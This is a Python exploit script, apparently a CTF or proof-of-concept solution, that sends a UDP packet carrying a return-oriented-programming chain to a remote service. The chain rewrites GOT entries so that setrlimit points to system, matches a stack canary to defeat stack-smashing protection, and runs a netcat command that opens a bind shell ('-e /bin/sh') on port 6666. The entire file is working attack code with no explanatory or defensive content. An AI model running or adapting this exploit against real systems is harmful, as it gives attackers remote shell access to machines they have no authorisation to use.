#!/usr/bin/env python
import sys
import socket
import struct
 

def p(v):
    return struct.pack('<L', v)
 
# create a rop wich writes string(s) to address(addr)
def rop_cpystr(addr, s):
    rop = ''
    for i in range(len(s) / 4):
        rop += p(0x08048c92) # pop ebx; pop ebp; ret;
        rop += p(((addr+(i*4)) - 0x5d5b04c4) & 0xFFFFFFFF) # address
        rop += s[(i*4) : (i*4) + 4] # data
        rop += p(0x0805d1e3) # xchg ecx, ebp; ret;
        rop += p(0x080581f9) # xchg eax, ecx; ret;
        rop += p(0x08048c8e) # add dword ptr [ebx + 0x5d5b04c4], eax; ret;
    return rop
 
# create a rop that adds a value(v) to the value at address(addr)
def rop_addvalue(addr, v):
    rop = ''
    rop += p(0x08048c92) # pop ebx; pop ebp; ret;
    rop += p((addr - 0x5d5b04c4) & 0xFFFFFFFF) # address
    rop += p(v)
    rop += p(0x0805d1e3) # xchg ecx, ebp; ret;
    rop += p(0x080581f9) # xchg eax, ecx; ret;
    rop += p(0x08048c8e) # add dword ptr [ebx + 0x5d5b04c4], eax; ret;
    return rop
 
# main exploit code
def main(host, port):
    __popr          = 0x08048f86
    __bss           = 0x08063384
    __setrlimit_got = 0x080632A8
    __jmp_setrlimit = 0x080488E0
    __write_got     = 0x080632D0
    __jmp_write     = 0x08048980
    # 2084 bytes, retn @ 28+
    # 0x8060e1b:    lea    esp,[ebp-0xc]
    # 0x8060e1e:    pop    ebx
    # 0x8060e1f:    pop    esi
    # 0x8060e20:    pop    edi
    # 0x8060e21:    pop    ebp
    rop  = 12 * 'A' # [ebp-0Ch]
    rop += p(0) # ebx
    rop += p(0) # esi
    rop += p(0) # edi
    rop += p(0) # ebp
    # increment setrlimit + 0xC1DD0 -> libc.system
    rop += rop_addvalue(__setrlimit_got, 0xC1DD0)
    # increment write + 0x39A54 -> vdso.__kernel_vsyscall
    rop += rop_addvalue(__write_got, 0x39A54)
    # write the netcat command string to .bss
    rop += rop_cpystr(__bss, '/bin/nc.traditional -lvp 6666 -e /bin/sh')
    # system('netcat command')
    rop += p(__jmp_setrlimit)
    rop += p(__popr)
    rop += p(__bss)
    rop += p(0x43434343)
    # padd till 2080 bytes
    rop  = rop.ljust(2080, 'A')
    # jmp to vdso.__kernel_vsyscall
    rop += p(__jmp_write)
 
    # construct the payload packet
    payload =  64 * 'A'
    payload += '-OO-' # <= canarie 1
    payload += rop
    payload += '-OO-' # <= canarie 2, must match canarie 1 to bypass the stack smashing detection!
 
 
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        client.sendto('\x1f\x0e\xff\xff' +  payload, (host, int(port)))
    except KeyboardInterrupt:
        client.close()
        return
 
if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2])
